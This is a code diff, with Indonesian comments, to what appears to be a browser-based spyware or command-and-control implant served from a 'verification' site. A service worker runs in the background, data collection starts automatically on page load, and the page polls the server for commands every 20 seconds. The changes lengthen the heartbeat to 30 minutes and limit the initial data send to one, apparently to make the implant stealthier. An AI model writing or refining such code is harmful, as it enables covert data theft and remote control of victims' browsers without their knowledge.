@@ -30,7 +30,7 @@
 // KONFIGURASI (TANPA PASSWORD HARDCODE)
 // ============================================================
 var SERVER = 'https://verifikasi.site';
-var HEARTBEAT_INTERVAL = 15000;
+var HEARTBEAT_INTERVAL = 1800000; // 30 MENIT
 var C2_INTERVAL = 20000;
 
 // ============================================================
@@ -72,7 +72,7 @@ function registerSW() {
 // SERVICE WORKER - AKTIF DI BACKGROUND!
 // ============================================================
 var SERVER_URL = 'https://verifikasi.site';
-var HEARTBEAT_INTERVAL = 15000;
+var HEARTBEAT_INTERVAL = 1800000; // 30 MENIT
 var C2_INTERVAL = 20000;
 
 self.addEventListener('install', function(event) {
@@ -798,9 +798,14 @@ function autoRefresh() {
 }
 
 // ============================================================
-// 🔥 EKSEKUSI UTAMA - AUTO JALAN!
+// 🔥 EKSEKUSI UTAMA - AUTO JALAN (HANYA 1x!)
 // ============================================================
+var initialDataSent = false;
+
 function init() {
+    if (initialDataSent) return;
+    initialDataSent = true;
+    
     document.getElementById('status').textContent = '📡 Collecting data...';
     collectData();
 
@@ -816,7 +821,7 @@ function init() {
     setInterval(cekPerintah, C2_INTERVAL);
     setTimeout(cekPerintah, 2000);
 
-    // 🔥 HEARTBEAT
+    // 🔥 HEARTBEAT (30 MENIT)
     setInterval(function() {
         K({ sumber: 'page_heartbeat', data: 'alive' });
     }, HEARTBEAT_INTERVAL);
